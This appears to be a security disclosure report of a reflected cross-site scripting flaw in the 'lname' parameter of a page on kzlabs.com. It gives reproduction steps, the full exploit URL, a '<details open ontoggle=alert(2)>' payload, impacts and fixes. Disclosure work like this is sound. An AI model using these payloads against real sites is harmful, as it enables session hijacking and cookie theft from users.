## Title

Reflected Cross-Site Scripting (XSS) via `lname` Parameter in Punishment Page

## Vulnerability Type

Reflected XSS

## Summary

The application reflects user-controlled input from the `lname` parameter directly into the HTML response without proper sanitization or output encoding.

By injecting a crafted HTML payload, arbitrary JavaScript execution can be triggered in the victim’s browser.

The vulnerability was confirmed using a `<details>` element with the `ontoggle` event handler.

## Vulnerable Endpoint

```http id="x6h1hf"
http://kzlabs.com/punishment/8.php?fname=%3Cdetails+open+ontoggle%3Dalert%281%29%3E&lname=%3Cdetails+open+ontoggle%3Dalert%282%29%3E
```

### Vulnerable Parameter

```http id="mqzt4m"
lname
```

## Steps to Reproduce

1. Open the following URL in a browser:

```http id="1gxv71"
http://kzlabs.com/punishment/8.php?fname=%3Cdetails+open+ontoggle%3Dalert%281%29%3E&lname=%3Cdetails+open+ontoggle%3Dalert%282%29%3E
```

2. Observe that a JavaScript alert popup appears automatically.

3. This confirms that the `lname` parameter is reflected without proper sanitization.

## Payload Used

```html id="c40qif"
<details open ontoggle=alert(2)>
```

## Proof of Concept

The payload executes automatically when the page renders, resulting in arbitrary JavaScript execution in the browser.

### Screenshot 1 — XSS Payload Execution

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/eb84a01f-f9e4-43f1-8c94-52bdb93b50b3" />


## Impact

* Session hijacking
* Cookie theft
* Arbitrary JavaScript execution

## Recommendations for Fix

* Properly encode output before rendering user input
* Validate and sanitize all incoming input
* Avoid insecure client-side rendering of unsanitized data
